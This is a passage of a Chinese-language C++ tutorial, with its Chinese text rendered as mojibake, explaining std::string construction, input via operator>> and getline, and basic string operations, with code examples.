class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // å¿…é¡»åŒ…å«æ­¤å¤´æ–‡ä»¶</span></span></span><br></pre></td></tr></table></figure><h3 id="16-1-1-æ„é€ å­—ç¬¦ä¸²"><a href="#16-1-1-æ„é€ å­—ç¬¦ä¸²" class="headerlink" title="16.1.1 æ„é€ å­—ç¬¦ä¸²"></a>16.1.1 æ„é€ å­—ç¬¦ä¸²</h3><p>åˆ›å»º <code>string</code> å¯¹è±¡æœ‰å¤šç§æ–¹å¼ï¼ˆæ„é€ å‡½æ•°ï¼‰ï¼š</p><ol><li><strong>é»˜è®¤æ„é€ å‡½æ•°:</strong> åˆ›å»ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s1; <span class="comment">// s1 æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸² &quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li>*<em>ä» C é£æ ¼å­—ç¬¦ä¸² (const char</em>)**: ç”¨ä¸€ä¸ª C é£æ ¼å­—ç¬¦ä¸²æ¥åˆå§‹åŒ– <code>string</code> å¯¹è±¡ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// ä»å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* c_str = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s3</span><span class="params">(c_str)</span></span>; <span class="comment">// ä» const char* å˜é‡åˆå§‹åŒ–</span></span><br></pre></td></tr></table></figure></li><li><strong>å¤åˆ¶æ„é€ å‡½æ•°:</strong> ç”¨å¦ä¸€ä¸ª <code>string</code> å¯¹è±¡æ¥åˆå§‹åŒ–ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s4 = s2; <span class="comment">// s4 çš„å†…å®¹æ˜¯ &quot;Hello&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s5</span><span class="params">(s4)</span></span>;  <span class="comment">// s5 çš„å†…å®¹ä¹Ÿæ˜¯ &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>ä» C é£æ ¼å­—ç¬¦ä¸²çš„éƒ¨åˆ†å†…å®¹:</strong> ç”¨ C é£æ ¼å­—ç¬¦ä¸²çš„å‰ <code>n</code> ä¸ªå­—ç¬¦åˆå§‹åŒ–ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* long_cstr = <span class="string">&quot;Programming&quot;</span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s6</span><span class="params">(long_cstr, <span class="number">7</span>)</span></span>; <span class="comment">// ç”¨ &quot;Programming&quot; çš„å‰ 7 ä¸ªå­—ç¬¦åˆå§‹åŒ– s6ï¼Œå†…å®¹æ˜¯ &quot;Program&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>ä» <code>string</code> å¯¹è±¡çš„éƒ¨åˆ†å†…å®¹ (å­å­—ç¬¦ä¸²):</strong> ç”¨å¦ä¸€ä¸ª <code>string</code> å¯¹è±¡çš„å­å­—ç¬¦ä¸²åˆå§‹åŒ–ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s7 = <span class="string">&quot;Example String&quot;</span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s8</span><span class="params">(s7, <span class="number">8</span>, <span class="number">6</span>)</span></span>; <span class="comment">// ä» s7 çš„ç´¢å¼• 8 å¼€å§‹ï¼Œå– 6 ä¸ªå­—ç¬¦åˆå§‹åŒ– s8ï¼Œå†…å®¹æ˜¯ &quot;String&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>å¡«å……æ„é€ å‡½æ•°:</strong> ç”¨ <code>n</code> ä¸ªé‡å¤çš„å­—ç¬¦ <code>c</code> åˆå§‹åŒ–ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s9</span><span class="params">(<span class="number">10</span>, <span class="string">&#x27;-&#x27;</span>)</span></span>; <span class="comment">// s9 çš„å†…å®¹æ˜¯ &quot;----------&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>ä»è¿­ä»£å™¨èŒƒå›´:</strong> ç”¨ä¸€å¯¹æŒ‡å‘å­—ç¬¦åºåˆ—çš„è¿­ä»£å™¨ï¼ˆä¾‹å¦‚æ¥è‡ªå¦ä¸€ä¸ªå®¹å™¨æˆ– C é£æ ¼æ•°ç»„ï¼‰æ¥åˆå§‹åŒ–ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> char_array[] = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s10</span><span class="params">(char_array, char_array + <span class="keyword">sizeof</span>(char_array))</span></span>; <span class="comment">// s10 å†…å®¹æ˜¯ &quot;Test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; char_vec = &#123;<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s11</span><span class="params">(char_vec.begin(), char_vec.end())</span></span>; <span class="comment">// s11 å†…å®¹æ˜¯ &quot;Data&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ (C++11):</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s12 = &#123;<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;t&#x27;</span>&#125;; <span class="comment">// s12 å†…å®¹æ˜¯ &quot;Init&quot;</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s13 &#123;<span class="string">&quot;List&quot;</span>&#125;; <span class="comment">// s13 å†…å®¹æ˜¯ &quot;List&quot;</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s3</span><span class="params">(s2)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s4</span><span class="params">(<span class="number">5</span>, <span class="string">&#x27;x&#x27;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* phrase = <span class="string">&quot;World Wide Web&quot;</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s5</span><span class="params">(phrase, <span class="number">5</span>)</span></span>; <span class="comment">// &quot;World&quot;</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s6</span><span class="params">(phrase + <span class="number">6</span>, <span class="number">4</span>)</span></span>; <span class="comment">// &quot;Wide&quot; (ä»ç´¢å¼•6å¼€å§‹å–4ä¸ª)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s7</span><span class="params">(s2, <span class="number">1</span>, <span class="number">3</span>)</span></span>; <span class="comment">// ä» s2[1] å¼€å§‹å– 3 ä¸ª: &quot;ell&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s2: &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s5: &quot;</span> &lt;&lt; s5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s6: &quot;</span> &lt;&lt; s6 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s7: &quot;</span> &lt;&lt; s7 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-1-2-string-ç±»è¾“å…¥"><a href="#16-1-2-string-ç±»è¾“å…¥" class="headerlink" title="16.1.2 string ç±»è¾“å…¥"></a>16.1.2 string ç±»è¾“å…¥</h3><p>ä»è¾“å…¥æµï¼ˆå¦‚ <code>cin</code>ï¼‰è¯»å–æ•°æ®åˆ° <code>string</code> å¯¹è±¡ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li><p><strong>ä½¿ç”¨ <code>operator&gt;&gt;</code>:</strong></p><ul><li><p>  è¡Œä¸ºç±»ä¼¼äºè¯»å– C é£æ ¼å­—ç¬¦ä¸²æˆ–åŸºæœ¬æ•°æ®ç±»å‹ã€‚</p></li><li><p>  å®ƒä¼š<strong>è·³è¿‡å¼€å¤´</strong>çš„æ‰€æœ‰ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚</p></li><li><p>  ç„¶åè¯»å–éç©ºç™½å­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½å­—ç¬¦ä¸ºæ­¢ã€‚</p></li><li><p>è¯»å–çš„å†…å®¹ï¼ˆä¸åŒ…æ‹¬ç»“å°¾çš„ç©ºç™½å­—ç¬¦ï¼‰å­˜å‚¨åœ¨ <code>string</code> å¯¹è±¡ä¸­ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt; // ç”¨äºå­—ç¬¦ä¸²æµç¤ºä¾‹</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word1, word2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter two words separated by space: &quot;</span>; <span class="comment">// ä¾‹å¦‚è¾“å…¥ &quot;Hello World&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word1 &gt;&gt; word2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 1: &quot;</span> &lt;&lt; word1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;Hello&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 2: &quot;</span> &lt;&lt; word2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;World&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¼”ç¤ºè·³è¿‡ç©ºç™½</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">stringstream</span> <span class="title">ss</span><span class="params">(<span class="string">&quot;   LeadingSpaces Word&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> temp;</span><br><span class="line">    ss &gt;&gt; temp;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After skipping spaces: &quot;</span> &lt;&lt; temp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;LeadingSpaces&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ä½¿ç”¨ <code>getline()</code> å‡½æ•°:</strong></p><ul><li><p>  ç”¨äºè¯»å–<strong>ä¸€æ•´è¡Œ</strong>è¾“å…¥ï¼Œç›´åˆ°é‡åˆ°æŒ‡å®šçš„åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºæ¢è¡Œç¬¦ <code>\n</code>ï¼‰ã€‚</p></li><li><p>  <strong>ä¸ä¼š</strong>è·³è¿‡å¼€å¤´çš„ç©ºç™½å­—ç¬¦ã€‚</p></li><li><p>  è¯»å–çš„å†…å®¹ï¼ˆ<strong>ä¸åŒ…æ‹¬</strong>åˆ†éš”ç¬¦æœ¬èº«ï¼‰å­˜å‚¨åœ¨ <code>string</code> å¯¹è±¡ä¸­ã€‚</p></li><li><p>  åˆ†éš”ç¬¦ä¼šä»è¾“å…¥æµä¸­è¢«è¯»å–å¹¶ä¸¢å¼ƒã€‚</p></li><li><p>*å‡½æ•°åŸå‹:**</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;istream&gt; // getline å®šä¹‰åœ¨è¿™é‡Œ</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::istream&amp; <span class="title">getline</span><span class="params">(<span class="built_in">std</span>::istream&amp; is, <span class="built_in">std</span>::<span class="built_in">string</span>&amp; str, <span class="keyword">char</span> delim = <span class="string">&#x27;\n&#x27;</span>)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line1, line2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a line of text: &quot;</span>;</span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šå¦‚æœä¹‹å‰æœ‰ &gt;&gt; æ“ä½œï¼Œå¯èƒ½éœ€è¦æ¸…é™¤ç¼“å†²åŒºä¸­çš„æ¢è¡Œç¬¦</span></span><br><span class="line">    <span class="comment">// std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\n&#x27;);</span></span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, line1); <span class="comment">// è¯»å–æ•´è¡Œï¼Œç›´åˆ°æŒ‰ Enter</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter another line: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, line2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1: &quot;</span> &lt;&lt; line1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 2: &quot;</span> &lt;&lt; line2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>æ··åˆä½¿ç”¨ <code>&gt;&gt;</code> å’Œ <code>getline()</code> çš„é—®é¢˜:</strong><br>å½“ <code>&gt;&gt;</code> è¯»å–è¾“å…¥åï¼Œå®ƒä¼šå°†å¯¼è‡´è¯»å–ç»“æŸçš„ç©ºç™½å­—ç¬¦ï¼ˆé€šå¸¸æ˜¯æ¢è¡Œç¬¦ï¼‰ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚å¦‚æœç´§æ¥ç€è°ƒç”¨ <code>getline()</code>ï¼Œå®ƒä¼šç«‹å³è¯»åˆ°è¿™ä¸ªæ¢è¡Œç¬¦ï¼Œè®¤ä¸ºè¯»å–åˆ°ç©ºè¡Œï¼Œç„¶åç»“æŸã€‚</p><p><strong>è§£å†³æ–¹æ³•:</strong> åœ¨ <code>&gt;&gt;</code> ä¹‹åã€<code>getline()</code> ä¹‹å‰ï¼Œæ¸…é™¤ç¼“å†²åŒºä¸­æ®‹ç•™çš„æ¢è¡Œç¬¦ã€‚å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ <code>cin.ignore()</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // for numeric_limits</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…é™¤ cin &gt;&gt; age åç•™ä¸‹çš„æ¢è¡Œç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-1-3-ä½¿ç”¨å­—ç¬¦ä¸²"><a href="#16-1-3-ä½¿ç”¨å­—ç¬¦ä¸²" class="headerlink" title="16.1.3 ä½¿ç”¨å­—ç¬¦ä¸²"></a>16.1.3 ä½¿ç”¨å­—ç¬¦ä¸²</h3><p><code>string</code> ç±»æä¾›äº†ä¸°å¯Œçš„æˆå‘˜å‡½æ•°æ¥æ“ä½œå­—ç¬¦ä¸²ï¼š</p><ul><li><p><strong>èµ‹å€¼:</strong> ä½¿ç”¨ <code>operator=</code>ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Initial&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s2;</span><br><span class="line">s2 = s1; <span class="comment">// s2 å†…å®¹å˜ä¸º &quot;Initial&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;New Value&quot;</span>; <span class="comment">// s2 å†…å®¹å˜ä¸º &quot;New Value&quot;</span></span><br><span class="line">s2 = <span class="string">&#x27;C&#x27;</span>; <span class="comment">// s2 å†…å®¹å˜ä¸º &quot;C&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>æ‹¼æ¥/è¿æ¥:</strong> ä½¿ç”¨ <code>operator+</code> æˆ– <code>operator+=</code>ã€‚å¯ä»¥ä¸ <code>string</code> å¯¹è±¡ã€C é£æ ¼å­—ç¬¦ä¸²æˆ–å•ä¸ªå­—ç¬¦æ‹¼æ¥ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> first = <span class="string">&quot;John&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> last = <span class="string">&quot;Doe&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> full = first + <span class="string">&quot; &quot;</span> + last; <span class="comment">// full æ˜¯ &quot;John Doe&quot;</span></span><br><span class="line">first += <span class="string">&quot;athan&quot;</span>; <span class="comment">// first å˜ä¸º &quot;Johnathan&quot;</span></span><br><span class="line">full += <span class="string">&#x27;!&#x27;</span>; <span class="comment">// full å˜ä¸º &quot;John Doe!&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>æ¯”è¾ƒ:</strong> ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ (<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>)ã€‚æ¯”è¾ƒæ˜¯æŒ‰å­—å…¸é¡ºåºè¿›è¡Œçš„ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str1 = <span class="string">&quot;Apple&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str2 = <span class="string">&quot;Banana&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (str1 &lt; str2) &#123; <span class="comment">// true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; str1 &lt;&lt; <span class="string">&quot; comes before &quot;</span> &lt;&lt; str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (str1 == <span class="string">&quot;Apple&quot;</span>) &#123; <span class="comment">// true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;str1 is Apple&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>è·å–é•¿åº¦/å¤§å°:</strong> ä½¿ç”¨ <code>length()</code> æˆ– <code>size()</code> æ–¹æ³•ï¼ˆä¸¤è€…ç­‰ä»·ï¼‰ã€‚è¿”å›å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ•°ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> msg = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; msg.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 5</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size: &quot;</span> &lt;&lt; msg.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// è¾“å‡º 5</span></span><br></pre></td></tr></table></figure></li><li><p><strong>è®¿é—®å­—ç¬¦:</strong></p><ul><li><p>  <code>operator[]</code>: 